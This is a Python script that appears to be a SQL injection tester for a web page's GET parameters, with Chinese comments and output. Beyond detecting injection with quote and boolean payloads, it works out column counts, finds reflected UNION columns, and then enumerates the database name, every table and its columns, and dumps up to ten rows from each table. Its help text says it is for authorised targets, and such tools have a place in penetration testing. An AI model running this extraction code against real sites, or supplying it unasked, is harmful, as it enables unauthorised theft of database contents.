from __future__ import annotations

import argparse
import difflib
import html
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Iterable

from config import DEFAULT_COOKIE, DEFAULT_DELAY, DEFAULT_TARGET, DEFAULT_TIMEOUT


ERROR_SIGNATURES = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "odbc sql server driver",
    "microsoft ole db provider for sql server",
    "postgresql query failed",
    "pg_query",
    "sqlite error",
    "unknown column",
    "different number of columns",
    "the used select statements have a different number of columns",
)

TEST_PAYLOADS = (
    "'",
    '"',
    " OR 1=1",
    " AND 1=2",
    " OR '1'='1",
    " AND '1'='2",
    "' OR '1'='1' -- ",
    "' AND '1'='2' -- ",
)

FOLLOW_UP_PAYLOADS = (
    "1 ORDER BY 1-- ",
    "1 ORDER BY 2-- ",
    "1 ORDER BY 3-- ",
    "1 UNION SELECT NULL-- ",
    "1 UNION SELECT NULL,NULL-- ",
    "1 UNION SELECT NULL,NULL,NULL-- ",
)


@dataclass(frozen=True)
class ResponseSnapshot:
    url: str
    status: int | None
    body: str
    elapsed: float
    error: str | None = None


@dataclass(frozen=True)
class Finding:
    parameter: str
    payload: str
    reason: str
    score: float


def parse_cookie(cookie_header: str) -> dict[str, str]:
    cookies: dict[str, str] = {}
    for part in cookie_header.split(";"):
        if "=" not in part:
            continue
        name, value = part.split("=", 1)
        cookies[name.strip()] = value.strip()
    return cookies


def build_url_with_param(target_url: str, parameter: str, value: str) -> str:
    parsed = urllib.parse.urlsplit(target_url)
    query_items = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    updated_items = [(name, value if name == parameter else current) for name, current in query_items]
    query = urllib.parse.urlencode(updated_items, doseq=True)
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, query, parsed.fragment))


def extract_get_parameters(target_url: str) -> list[tuple[str, str]]:
    parsed = urllib.parse.urlsplit(target_url)
    return urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)


def request_url(url: str, cookie: str, timeout: int) -> ResponseSnapshot:
    headers = {
        "User-Agent": "local-sqli-tester/1.0",
        "Cookie": cookie,
    }
    request = urllib.request.Request(url, headers=headers, method="GET")
    start = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            charset = response.headers.get_content_charset() or "utf-8"
            body = response.read().decode(charset, errors="replace")
            return ResponseSnapshot(url, response.status, body, time.monotonic() - start)
    except urllib.error.HTTPError as exc:
        charset = exc.headers.get_content_charset() or "utf-8"
        body = exc.read().decode(charset, errors="replace")
        return ResponseSnapshot(url, exc.code, body, time.monotonic() - start, str(exc))
    except urllib.error.URLError as exc:
        return ResponseSnapshot(url, None, "", time.monotonic() - start, str(exc.reason))
    except TimeoutError as exc:
        return ResponseSnapshot(url, None, "", time.monotonic() - start, str(exc))


def normalize_body(body: str) -> str:
    text = html.unescape(body).lower()
    return " ".join(text.split())


def has_sql_error(body: str) -> bool:
    normalized = normalize_body(body)
    return any(signature in normalized for signature in ERROR_SIGNATURES)


def similarity(left: str, right: str) -> float:
    return difflib.SequenceMatcher(None, normalize_body(left), normalize_body(right)).ratio()


def analyze_response(base: ResponseSnapshot, test: ResponseSnapshot, payload: str, true_response: ResponseSnapshot | None = None) -> tuple[str | None, float]:
    if test.error and not test.body:
        return None, 0.0

    if has_sql_error(test.body):
        return "response contains a common SQL error signature", 0.95

    ratio = similarity(base.body, test.body)
    if true_response is not None:
        true_false_ratio = similarity(true_response.body, test.body)
        base_false_ratio = similarity(base.body, test.body)
        if true_false_ratio < 0.92 and base_false_ratio < 0.98:
            return f"boolean-based response difference detected (true/false similarity {true_false_ratio:.2f})", 0.85

    if ratio < 0.82 and any(token in payload.lower() for token in (" or ", " and ", "'", '"')):
        return f"response body changed significantly from baseline (similarity {ratio:.2f})", 0.65

    if base.status != test.status:
        return f"HTTP status changed from {base.status} to {test.status}", 0.45

    return None, 0.0


def test_parameter(target_url: str, parameter: str, original_value: str, cookie: str, timeout: int, delay: float) -> list[Finding]:
    baseline = request_url(target_url, cookie, timeout)
    findings: list[Finding] = []

    true_response: ResponseSnapshot | None = None
    for payload in TEST_PAYLOADS:
        test_url = build_url_with_param(target_url, parameter, f"{original_value}{payload}")
        response = request_url(test_url, cookie, timeout)
        reason, score = analyze_response(baseline, response, payload, true_response)
        if " or " in payload.lower() and response.body:
            true_response = response
        if reason:
            findings.append(Finding(parameter, payload, reason, score))
        if delay > 0:
            time.sleep(delay)

    return findings


def response_looks_successful(response: ResponseSnapshot) -> bool:
    return response.status is not None and response.status < 500 and not has_sql_error(response.body)


def find_column_count(target_url: str, parameter: str, original_value: str, cookie: str, timeout: int, delay: float, max_columns: int = 10) -> int | None:
    last_successful: int | None = None
    for column_number in range(1, max_columns + 1):
        payload = f"' ORDER BY {column_number}-- "
        test_url = build_url_with_param(target_url, parameter, f"{original_value}{payload}")
        response = request_url(test_url, cookie, timeout)
        status = response.status if response.status is not None else "ERR"
        result = "ok" if response_looks_successful(response) else "error"
        print(f"    ORDER BY {column_number}: status={status} {result} elapsed={response.elapsed:.2f}s")
        if response_looks_successful(response):
            last_successful = column_number
        elif last_successful is not None:
            return last_successful
        if delay > 0:
            time.sleep(delay)
    return last_successful


def find_reflected_columns(target_url: str, parameter: str, column_count: int, cookie: str, timeout: int) -> list[int]:
    markers = [f"sqli_col_{index}" for index in range(1, column_count + 1)]
    union_values = ",".join(f"'{marker}'" for marker in markers)
    payload = f"-1' UNION SELECT {union_values}-- "
    test_url = build_url_with_param(target_url, parameter, payload)
    response = request_url(test_url, cookie, timeout)
    normalized = normalize_body(response.body)
    return [index for index, marker in enumerate(markers, start=1) if marker in normalized]


def extract_between_markers(body: str, marker_name: str) -> list[str]:
    pattern = re.compile(rf"SQLI_{marker_name}_START(.*?)SQLI_{marker_name}_END", re.IGNORECASE | re.DOTALL)
    values: list[str] = []
    for match in pattern.finditer(html.unescape(body)):
        value = " ".join(match.group(1).split())
        if value and value not in values:
            values.append(value)
    return values


def to_hex(s: str) -> str:
    return "0x" + s.encode().hex()


SEP = to_hex("||")


def build_union_values(column_count: int, reflected_column: int, expression: str, marker_name: str) -> str:
    start = to_hex(f"SQLI_{marker_name}_START")
    end = to_hex(f"SQLI_{marker_name}_END")
    values = ["NULL"] * column_count
    # CONVERT ensures charset matches the original column (avoids 'Illegal mix of collations')
    values[reflected_column - 1] = f"CONCAT({start},CONVERT(({expression}) USING latin1),{end})"
    return ",".join(values)


def run_union_query(target_url: str, parameter: str, column_count: int, reflected_column: int, expression: str, marker_name: str, cookie: str, timeout: int) -> list[str]:
    union_values = build_union_values(column_count, reflected_column, expression, marker_name)
    payload = f"-1' UNION SELECT {union_values}-- "
    test_url = build_url_with_param(target_url, parameter, payload)
    response = request_url(test_url, cookie, timeout)
    return extract_between_markers(response.body, marker_name)


def enumerate_database_metadata(target_url: str, parameter: str, column_count: int, reflected_column: int, cookie: str, timeout: int) -> None:
    # --- 库名 ---
    db_results = run_union_query(
        target_url, parameter, column_count, reflected_column,
        "database()", "DB", cookie, timeout,
    )
    if not db_results:
        print("    [-] 未能获得当前库名。")
        return
    db_name = db_results[0]
    hex_db = to_hex(db_name)
    print(f"\n    [数据库] {db_name}")

    # --- 表名 ---
    tables_expr = f"IFNULL(GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR {SEP}),{to_hex('(empty)')})"
    tables_expr = f"(SELECT {tables_expr} FROM information_schema.tables WHERE table_schema={hex_db})"
    table_results = run_union_query(
        target_url, parameter, column_count, reflected_column,
        tables_expr, "TABLES", cookie, timeout,
    )
    if not table_results:
        print("    [-] 未能获得表名。")
        return
    tables = [t.strip() for t in table_results[0].split("||") if t.strip()]
    print(f"    [表名] {', '.join(tables)}")

    # --- 逐表枚举列名和数据 ---
    for table in tables:
        hex_table = to_hex(table)
        marker_cols = f"COLS_{re.sub(r'[^A-Za-z0-9_]', '_', table)}"

        cols_expr = f"IFNULL(GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR {SEP}),{to_hex('(empty)')})"
        cols_expr = f"(SELECT {cols_expr} FROM information_schema.columns WHERE table_schema={hex_db} AND table_name={hex_table})"
        col_results = run_union_query(
            target_url, parameter, column_count, reflected_column,
            cols_expr, marker_cols, cookie, timeout,
        )
        if not col_results:
            print(f"    [-] {table}: 未能获得列名")
            continue
        columns = [c.strip() for c in col_results[0].split("||") if c.strip()]
        print(f"\n    [{table}] 列名: {', '.join(columns)}")

        # 把每列内容用 CONCAT 拼成一行，最多取前 10 行
        row_sep = to_hex(" | ")
        col_sep = to_hex(" ~~ ")
        null_lit = to_hex("NULL")
        # CAST AS CHAR then CONVERT to latin1 avoids charset collation errors for datetime/int columns
        row_parts = [f"IFNULL(CONVERT(CAST(`{col}` AS CHAR) USING latin1),{null_lit})" for col in columns]
        row_expr_inner = f"CONCAT({(','+row_sep+',').join(row_parts)})"
        rows_expr = f"IFNULL(GROUP_CONCAT({row_expr_inner} SEPARATOR {col_sep}),{to_hex('(empty)')})"
        rows_expr = f"(SELECT {rows_expr} FROM `{table}` LIMIT 10)"
        marker_rows = f"ROWS_{re.sub(r'[^A-Za-z0-9_]', '_', table)}"
        row_results = run_union_query(
            target_url, parameter, column_count, reflected_column,
            rows_expr, marker_rows, cookie, timeout,
        )
        if not row_results:
            print(f"    [-] {table}: 未能读取数据")
            continue
        rows = [r.strip() for r in row_results[0].split(" ~~ ") if r.strip()]
        print(f"    [{table}] 数据 (前{len(rows)}行，列: {', '.join(columns)}):")
        for row in rows:
            print(f"        {row}")


def run_follow_up(target_url: str, parameter: str, original_value: str, cookie: str, timeout: int, delay: float) -> None:
    print(f"\n[+] {parameter} 参数疑似存在 SQL 注入，开始执行后续确认测试。")
    column_count = find_column_count(target_url, parameter, original_value, cookie, timeout, delay)
    if column_count is None:
        print("    [-] 未能确认字段列数。")
        return

    print(f"    [+] 确认字段列数: {column_count}")
    reflected_columns = find_reflected_columns(target_url, parameter, column_count, cookie, timeout)
    if not reflected_columns:
        print("    [-] 未发现可回显 UNION 列。")
        return

    columns = ", ".join(str(column) for column in reflected_columns)
    print(f"    [+] 可回显 UNION 列: {columns}")
    enumerate_database_metadata(target_url, parameter, column_count, reflected_columns[0], cookie, timeout)


def deduplicate_findings(findings: Iterable[Finding]) -> list[Finding]:
    seen: set[tuple[str, str, str]] = set()
    unique: list[Finding] = []
    for finding in sorted(findings, key=lambda item: item.score, reverse=True):
        key = (finding.parameter, finding.payload, finding.reason)
        if key in seen:
            continue
        seen.add(key)
        unique.append(finding)
    return unique


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="对授权目标的 GET 参数进行基础 SQL 注入测试。")
    parser.add_argument("--url", default=DEFAULT_TARGET, help="目标 URL，默认使用 config.py 中的 DEFAULT_TARGET")
    parser.add_argument("--cookie", default=DEFAULT_COOKIE, help="登录后的 Cookie 请求头")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="单个请求超时时间，单位秒")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="每次请求之间的延迟，单位秒")
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv or sys.argv[1:])
    parameters = extract_get_parameters(args.url)

    if not parameters:
        print("[-] 目标 URL 中没有 GET 参数。")
        return 1

    print(f"[*] Target: {args.url}")
    print(f"[*] Cookie fields: {', '.join(parse_cookie(args.cookie).keys()) or '(none)'}")
    print(f"[*] Testing GET parameters: {', '.join(name for name, _ in parameters)}")

    all_findings: list[Finding] = []
    for parameter, original_value in parameters:
        print(f"\n[*] Testing parameter: {parameter}")
        findings = test_parameter(args.url, parameter, original_value, args.cookie, args.timeout, args.delay)
        all_findings.extend(findings)
        if findings:
            for finding in deduplicate_findings(findings):
                print(f"    [!] payload={finding.payload!r} score={finding.score:.2f} reason={finding.reason}")
            run_follow_up(args.url, parameter, original_value, args.cookie, args.timeout, args.delay)
        else:
            print("    [-] 未发现明显 SQL 注入迹象。")

    unique_findings = deduplicate_findings(all_findings)
    print("\n=== Summary ===")
    if not unique_findings:
        print("未发现明显 SQL 注入漏洞。")
        return 0

    for finding in unique_findings:
        print(f"{finding.parameter}: payload={finding.payload!r}, score={finding.score:.2f}, {finding.reason}")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
